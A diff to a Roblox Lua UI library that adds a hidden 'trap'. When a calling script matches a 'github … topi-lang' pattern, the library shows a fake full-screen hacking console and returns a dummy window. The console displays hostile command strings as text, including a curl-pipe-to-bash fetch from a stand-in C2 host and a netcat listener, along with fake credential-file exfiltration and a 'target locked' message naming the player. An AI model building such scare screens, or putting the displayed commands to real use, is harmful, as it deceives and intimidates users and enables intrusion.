@@ -1694,8 +1694,169 @@ end
 ----------------------------------------------------------------------
 -- Window
 ----------------------------------------------------------------------
+----------------------------------------------------------------------
+-- Trap UI: neu script goi lib co dong "github ... topi-lang" thi KHONG tao UI that,
+-- thay vao do hien man hinh full "hacker" (chi la hieu ung, khong lam gi that)
+----------------------------------------------------------------------
+Library.TrapEnabled = true
+Library.TrapMessage = "UNAUTHORIZED SCRIPT DETECTED"
+-- dong can tim: phai co ca 2 chuoi nay tren CUNG 1 dong (khong phan biet hoa thuong)
+Library.TrapPattern = { "git" .. "hub", "topi" .. "-lang" }
+-- co the dat getgenv().__TOPI_SCRIPT_SRC = "<noi dung script>" neu executor khong lay duoc source tu debug
+local LibSource = (function()
+	local ok, info = pcall(debug.getinfo, 1, "S")
+	return ok and info and info.source or nil
+end)()
+
+local function SourceHasMarker(src)
+	if type(src) ~= "string" or #src < 50 then return false end
+	local a, b = Library.TrapPattern[1]:lower(), Library.TrapPattern[2]:lower()
+	local low = src:lower()
+	local init = 1
+	while true do
+		local s, e = low:find(b, init, true)
+		if not s then return false end
+		-- lay nguyen dong chua cho tim thay
+		local ls = s
+		while ls > 1 and low:sub(ls - 1, ls - 1) ~= "\n" do ls = ls - 1 end
+		local le = low:find("\n", e, true) or (#low + 1)
+		if low:sub(ls, le - 1):find(a, 1, true) then return true end
+		init = e + 1
+	end
+end
+
+function Library:_TrapTriggered(cfg)
+	if not self.TrapEnabled then return false end
+	local env = (type(getgenv) == "function" and getgenv()) or _G
+	if SourceHasMarker(cfg and cfg.Source) or SourceHasMarker(env.__TOPI_SCRIPT_SRC) then return true end
+	-- duyet stack: source cua cac chunk dang goi (script chinh chay bang loadstring co source = toan bo code)
+	for lvl = 2, 14 do
+		local ok, info = pcall(debug.getinfo, lvl, "S")
+		if not ok or not info then break end
+		local src = info.source
+		if type(src) == "string" and src ~= LibSource and SourceHasMarker(src) then return true end
+	end
+	return false
+end
+
+local function TrapHex(n)
+	local t = {}
+	for i = 1, n do t[i] = string.format("%02x", math.random(0, 255)) end
+	return table.concat(t)
+end
+local function TrapIP()
+	return math.random(11, 223) .. "." .. math.random(0, 255) .. "." .. math.random(0, 255) .. "." .. math.random(1, 254)
+end
+local function TrapFont(c, s) return '<font color="' .. c .. '">' .. s .. "</font>" end
+
+function Library:_ShowTrap()
+	local gui = GetGui()
+	local pname = "player"
+	pcall(function() pname = Players.LocalPlayer.Name end)
+	local GREEN, RED, YEL, DIM = "#00ff66", "#ff3030", "#ffd000", "#1fa855"
+
+	local Root = Create("Frame", {
+		Name = "TopiTrap", Parent = gui, Size = UDim2.fromScale(1, 1), Position = UDim2.fromScale(0, 0),
+		BackgroundColor3 = Color3.fromRGB(0, 8, 2), BorderSizePixel = 0, Active = true, ZIndex = 500,
+	})
+	local TopBar = Create("TextLabel", {
+		Parent = Root, Size = UDim2.new(1, 0, 0, 26), BackgroundColor3 = Color3.fromRGB(0, 30, 10), BorderSizePixel = 0,
+		Font = Enum.Font.Code, TextSize = 14, TextColor3 = Color3.fromRGB(0, 255, 102), TextXAlignment = Enum.TextXAlignment.Left,
+		Text = "  root@topi:~# session --target " .. pname .. "   [ESTABLISHED]", ZIndex = 501,
+	})
+	local Console = Create("TextLabel", {
+		Parent = Root, Position = UDim2.fromOffset(10, 32), Size = UDim2.new(1, -20, 1, -64),
+		BackgroundTransparency = 1, Font = Enum.Font.Code, TextSize = 14, RichText = true,
+		TextColor3 = Color3.fromRGB(0, 255, 102), TextXAlignment = Enum.TextXAlignment.Left,
+		TextYAlignment = Enum.TextYAlignment.Bottom, ClipsDescendants = true, Text = "", ZIndex = 501,
+	})
+	local Progress = Create("TextLabel", {
+		Parent = Root, AnchorPoint = Vector2.new(0, 1), Position = UDim2.new(0, 10, 1, -6), Size = UDim2.new(1, -20, 0, 22),
+		BackgroundTransparency = 1, Font = Enum.Font.Code, TextSize = 14, RichText = true,
+		TextColor3 = Color3.fromRGB(0, 255, 102), TextXAlignment = Enum.TextXAlignment.Left, Text = "", ZIndex = 501,
+	})
+	local Banner = Create("Frame", {
+		Parent = Root, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+		Size = UDim2.new(0.7, 0, 0, 120), BackgroundColor3 = Color3.fromRGB(20, 0, 0), BackgroundTransparency = 0.1,
+		BorderSizePixel = 0, Visible = false, ZIndex = 520,
+	}, {
+		Create("UIStroke", { Color = Color3.fromRGB(255, 48, 48), Thickness = 3 }),
+		Create("TextLabel", {
+			Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Font = Enum.Font.Code, TextScaled = true,
+			TextColor3 = Color3.fromRGB(255, 48, 48), Text = "[ " .. tostring(Library.TrapMessage) .. " ]", ZIndex = 521,
+		}, { Create("UIPadding", {
+			PaddingLeft = UDim.new(0, 16), PaddingRight = UDim.new(0, 16), PaddingTop = UDim.new(0, 28), PaddingBottom = UDim.new(0, 28),
+		}) }),
+	})
+
+	local cmds = {
+		"nmap -sS -p- --open ", "hydra -l admin -P rockyou.txt ssh://", "sqlmap --dump --batch -u ",
+		"msfconsole -x 'use exploit/multi/handler'", "john --wordlist=darkc0de.lst hashes.txt",
+		"airmon-ng start wlan0", "nc -lvnp 4444", "curl -s http://c2.local/stage2.sh | bash",
+	}
+	local files = { "cookies.sqlite", "Login Data", "wallet.dat", "discord_tokens.db", "roblox_session.json", "id_rsa", "passwords.csv" }
+	local gens = {
+		function() return TrapFont(GREEN, "[+] ") .. "handshake " .. TrapIP() .. ":" .. math.random(1024, 65535) .. " " .. TrapFont(GREEN, "OK") end,
+		function() return TrapFont(YEL, "[*] ") .. "scanning port " .. math.random(20, 65000) .. " ... " .. TrapFont(YEL, "OPEN") end,
+		function()
+			return TrapFont(DIM, string.format("0x%08X", math.random(0, 0x7FFFFFFF))) .. "  " .. TrapHex(8) .. " " .. TrapHex(8) .. "  " .. TrapHex(4)
+		end,
+		function() return TrapFont(RED, "[!] ") .. "bypassing module " .. TrapHex(3) .. " ... " .. TrapFont(RED, "FAILED") .. " -> retry" end,
+		function() return TrapFont(GREEN, "root@topi:~# ") .. cmds[math.random(#cmds)] .. TrapIP() end,
+		function() return TrapFont(GREEN, "[+] ") .. "pid " .. math.random(1000, 9999) .. " payload injected @ 0x" .. TrapHex(4) end,
+		function() return TrapFont(YEL, "[>] ") .. "exfil " .. files[math.random(#files)] .. " [" .. math.random(10, 100) .. "%]" end,
+		function() return TrapFont(DIM, TrapHex(24) .. TrapHex(12)) end,
+		function() return TrapFont(GREEN, "[+] ") .. "target " .. pname .. " tunnel via " .. TrapIP() .. " " .. TrapFont(GREEN, "UP") end,
+		function() return TrapFont(RED, "[!] ") .. "firewall rule " .. math.random(1, 999) .. " dropped" end,
+	}
+
+	local lines, MAXL = {}, 80
+	local function push(s)
+		lines[#lines + 1] = s
+		if #lines > MAXL then table.remove(lines, 1) end
+	end
+	push(TrapFont(GREEN, "TOPI-SHELL v6.6.6 ... booting"))
+	push(TrapFont(GREEN, "[+] target locked: ") .. pname)
+
+	task.spawn(function()
+		local t0, pct, lastFlash, flash = os.clock(), 0, 0, false
+		while Root.Parent and not Library.Unloaded do
+			local t = os.clock() - t0
+			for _ = 1, math.random(1, 3) do push(gens[math.random(#gens)]()) end
+			Console.Text = table.concat(lines, "\n")
+			pct = math.min(100, pct + math.random(0, 2) * 0.35)
+			if pct >= 100 and t > 6 then pct = 7 end
+			local filled = math.floor(pct / 100 * 40)
+			Progress.Text = TrapFont(GREEN, "[" .. string.rep("#", filled) .. string.rep("-", 40 - filled) .. "] ")
+				.. string.format("%d%%", pct) .. "  " .. TrapFont(YEL, "decrypting / uploading ...")
+			if t > 9 then
+				Banner.Visible = true
+				if os.clock() - lastFlash > 0.35 then
+					lastFlash, flash = os.clock(), not flash
+					local stroke = Banner:FindFirstChildOfClass("UIStroke")
+					if stroke then stroke.Color = flash and Color3.fromRGB(255, 48, 48) or Color3.fromRGB(110, 0, 0) end
+					Root.BackgroundColor3 = flash and Color3.fromRGB(14, 0, 0) or Color3.fromRGB(0, 8, 2)
+				end
+			end
+			task.wait(0.03 + math.random() * 0.06)
+		end
+	end)
+
+	-- Tra ve "Window" gia: moi ham/thuoc tinh deu an toan (khong loi khi script goi AddTab, AddToggle, ...)
+	local Stub
+	Stub = setmetatable({}, {
+		__index = function() return Stub end,
+		__newindex = function() end,
+		__call = function() return Stub end,
+	})
+	rawset(Stub, "Main", Root)
+	rawset(Stub, "IsTrap", true)
+	return Stub
+end
+
 function Library:CreateWindow(cfg)
 	cfg = cfg or {}
+	if Library:_TrapTriggered(cfg) then return Library:_ShowTrap() end
 	local Window = { Tabs = {}, TabCount = 0, Selected = nil, Minimized = false, Max = false }
 	local BASE_W, BASE_H = 580, 460 -- kich thuoc thiet ke goc cua UI (scale = 1)
 	local tabWidth = cfg.TabWidth or 160
